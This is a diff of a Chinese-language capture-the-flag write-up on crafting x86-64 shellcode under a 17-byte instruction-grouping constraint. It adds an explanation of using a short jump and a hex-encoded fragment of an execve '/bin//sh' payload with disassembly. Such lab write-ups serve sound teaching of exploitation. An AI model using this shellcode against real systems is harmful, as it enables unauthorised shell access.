@@ -214,13 +214,13 @@ for i in range(0x100):
    3:   56                      push   rsi
 ```
 
-再用 `objdump -b binary -m i386:86-64 -M intel -D <executable>` 確認一次：
-<img src="image/0c876356.png" width="850" height="250">
+再用 `objdump -b binary -m i386:86-64 -M intel -D <executable>` 確認一次，和 `pwntools` 反組譯的結果一樣：
+<img src="image/0c876356.png" width="880" height="250">
 
-然而，實際用 gdb 動態追縱，發現指令並不是預先想像的那樣：
+然而，實際用 gdb 動態追縱時，發現指令並不是先前預想的那樣：
 <img src="image/0c876356_gdb.png" width="1000" height="500">
 
-因為電腦將 `0x0c 0x87 0x63 0x56` 和緊跟在後的 `0x48` 解讀為第ㄧ、二行指令，順帶也影響到接續的指令：
+研究了一下為何會發生這種狀況，發現是因為電腦會將 `0x0c 0x87 0x63 0x56` 和緊跟在後的 `0x48` 解讀為第ㄧ、二行指令，順帶也影響到接續的指令：
 ```assembly
 0c 87                	or     al, 0x87
 63 56 48                movsxd edx, DWORD PTR [rsi+0x48]
@@ -229,6 +229,30 @@ for i in range(0x100):
 
 因此，在湊好合適的指令集後，也需要留意有沒有上面的這種情況發生，以免影響到 shellcode 的執行\
 幸好在本次的形況下無傷大雅，所以就不管它了XD
+
+為了順利執行 shellcode，我們需要找到一個合適的 `jmp` 指令來跳過剩餘的 `0x0c 0x87 0x63`，\
+考慮到這題的限制，即每 17 bytes 必須形成一組有效的指令集，我們需要選擇一個盡可能少佔用字節的 `jmp` 指令，\
+因此我選擇了 `short jump` 作為執行此操作的指令
+
+下面是使用了 `short jump` 的ㄧ小段 shellcode：
+```bash
+# 0 ~ 3rd bytes
+head="\x0c\x87\x63\xd0"
+: << Instruction
+0c 87                   or    al, 0x87
+63 d0                   movsxd edx, eax
+Instruction
+
+# 4 ~ 19th bytes
+shellcode_sys_exeve_part1="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\xeb\x04"
+: << Instruction
+48 31 f6                xor    rsi, rsi
+56                      push   rsi
+48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f  # encoded from "/bin//sh"
+2f 73 68
+eb 04                   jmp short +0x4  # (jmp short 0x4), jump to buf[24]
+Instruction
+```
 
 
 ### 07_shellcode3
